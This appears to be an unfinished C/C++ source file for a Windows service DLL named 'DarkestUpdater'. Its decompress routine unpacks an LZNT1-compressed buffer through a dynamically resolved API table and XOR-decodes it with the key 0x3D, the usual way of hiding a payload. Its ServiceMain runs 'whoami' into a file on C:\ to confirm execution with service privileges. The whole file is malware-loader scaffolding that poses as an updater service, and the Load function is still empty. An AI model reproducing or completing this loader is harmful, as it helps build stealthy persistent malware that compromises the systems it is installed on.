//
// Created by mikul on 04.01.2026.
//

#include "Darkest_load.h"
#include "library.h"

API_TABLE api;

SERVICE_STATUS        g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;

unsigned char *decompress(PBYTE buffer, unsigned long size, unsigned long originalSize) {
    unsigned char *decompressed = (unsigned char *) malloc(originalSize);
    unsigned long finalSize = 0;

    NTSTATUS decompressStatus = api.RtlDecompressBuffer(
        COMPRESSION_FORMAT_LZNT1, decompressed, originalSize, buffer, size, &finalSize);
    if (decompressStatus != 0 || finalSize != originalSize) {
        free(decompressed);
        return nullptr;
    }

    for (ULONG i = 0; i < finalSize; i++) {
        decompressed[i] ^= 0x3D;
    }

    return decompressed;
}

void Load() {

}


__declspec(dllexport) void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    g_StatusHandle = RegisterServiceCtrlHandler("DarkestUpdater", NULL);

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    Load();

    system("whoami > C:\\success.txt");

    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}







